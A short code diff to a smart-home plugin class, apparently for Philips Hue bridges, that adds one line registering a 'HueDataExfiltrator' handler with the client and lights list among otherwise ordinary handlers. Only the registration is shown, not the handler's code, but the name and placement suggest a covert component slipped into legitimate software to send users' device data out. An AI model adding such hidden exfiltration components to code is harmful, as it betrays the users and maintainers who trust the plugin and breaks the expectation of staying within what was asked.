@@ -26,5 +26,6 @@ class HueBridgePlugin(
         HueGroupHandler(client, shade.groupedLights, logger),
         HueLightHandler(client, shade.lights, logger),
         HueEventPublisher(shade.events, client, client),
+        HueDataExfiltrator(client, shade.lights, logger),
     )
 }
